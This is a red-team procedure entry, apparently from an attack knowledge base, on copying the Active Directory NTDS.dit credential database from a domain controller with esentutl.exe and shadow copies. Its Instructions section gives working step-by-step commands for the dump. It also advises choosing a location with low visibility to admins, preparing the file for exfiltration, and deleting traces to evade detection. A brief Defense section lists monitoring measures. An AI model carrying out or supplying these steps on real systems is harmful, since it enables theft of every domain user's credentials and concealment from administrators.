---
id: abeaac88-5f4e-4374-a841-73f91c9cacce
name: Dump-NTDS-DIT-Using-Esentutl
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:03.936946+00:00'
updated_at: '2023-04-10T20:25:54.563094+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Credentials in Files|T1081 - Credentials in Files]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Dumping AD Domain Credentials]]'
  - '[[tags/Using esentutl.exe]]'
commands:
  - '[[commands/esentutl-backup-ntds-dit]]'
platforms:
  - Windows
tools: []
validated: true
---

# Dump-NTDS-DIT-Using-Esentutl

## Summary

This procedure uses the built-in Windows utility esentutl.exe to extract a copy of the NTDS.dit file from an Active Directory Domain Controller via the Volume Shadow Copy Service (VSS). The NTDS.dit file contains the hashed credentials of all domain users and computers, enabling offline extraction and cracking for credential access in post-exploitation scenarios.

## Description

In Active Directory environments, the NTDS.dit database file stores all domain objects, including user hashes (NTLM and Kerberos keys). While the domain controller is running, this file is locked and cannot be directly copied. Esentutl.exe, part of the Extensible Storage Engine (ESE), allows creation of a shadow copy to bypass this lock without stopping services. This technique is useful for attackers with administrative access to a domain controller, allowing them to dump credentials for pass-the-hash, Kerberoasting, or other attacks. It maps to MITRE ATT&CK T1081 (Credentials in Files) under the Credential Access tactic, targeting Windows Server domain controllers.

## Requirements

1. Administrative privileges on a domain controller or machine with access to the NTDS folder (typically SYSTEM or Domain Admin level).
2. The target must be a Windows Server running Active Directory Domain Services (2008 or later).
3. Volume Shadow Copy Service (VSS) must be enabled and functional.
4. Sufficient disk space on the target for the destination copy (NTDS.dit can be several GB).
5. Command-line access (e.g., via RDP, PSEXEC, or remote shell).

## Defense

- Restrict administrative access to domain controllers using least privilege principles and monitor for unusual logons (Event ID 4624 with high-privilege accounts).
- Enable advanced auditing for file access on %SystemRoot%\NTDS and monitor for esentutl.exe executions (Event ID 4688 with suspicious arguments like /vss).
- Use tools like Microsoft Defender for Identity to detect credential dumping attempts and implement protected users groups to limit hash usability.
- Regularly review VSS snapshots and configure Group Policy to restrict shadow copy creation.

## Objectives

1. Create a shadow copy of the locked NTDS.dit file without disrupting AD services.
2. Extract the NTDS.dit file to a accessible location for offline analysis.
3. Enable subsequent credential extraction using tools like Mimikatz or Impacket's secretsdump for domain compromise.

## Instructions

### Step 1: Verify Administrative Access and Prerequisites

**Context**: Confirm you have the necessary privileges and that VSS is operational, as esentutl requires admin rights and VSS to function. This prevents errors during execution.

Run a test to check VSS status:

```cmd
vssadmin list writers
```

> This command lists VSS writers; look for the 'Active Directory Domain Services' writer in a stable state (e.g., 'Stable - No Error'). If VSS is disabled or errored, enable it via services.msc or troubleshoot.

### Step 2: Create Destination Directory

**Context**: Prepare a writable location outside the protected NTDS folder to store the dumped file, avoiding permission issues and ensuring the copy can be exfiltrated.

Use the following command to create a folder:

```cmd
mkdir C:\temp\ntds_dump
```

> Expected output: The directory is created without errors. Verify with `dir C:\temp` to see the new folder. Choose a path with ample space and low visibility to admins.

### Step 3: Execute NTDS.dit Dump Using Esentutl

**Context**: Use esentutl.exe to leverage VSS for copying the locked NTDS.dit file. This step performs the core extraction, forcing overwrite if needed.

**Command** ([[commands/esentutl-backup-ntds-dit]]):

```cmd
esentutl.exe /y /vss %SystemRoot%\ntds\ntds.dit /d C:\temp\ntds_dump\ntds.dit
```

> The /y flag overwrites existing files, /vss enables shadow copy, the source is the default NTDS path, and /d specifies the destination. Expected output includes progress messages like 'Operation completed successfully' and details on the copied volume. The process may take several minutes depending on database size.

### Step 4: Verify Dump Success and Secure the File

**Context**: Confirm the file was copied intact and take steps to exfiltrate or process it, as the dump is now available for credential extraction tools.

Check file size and existence:

```cmd
dir C:\temp\ntds_dump\ntds.dit
```

> Expected output: File details showing size (typically 100MB+ for small domains). Compare size to original if possible (via `dir %SystemRoot%\ntds\ntds.dit`). If successful, proceed to extract SYSTEM hive and use tools like ntdsutil or secretsdump for hash parsing. Delete traces post-use to evade detection.
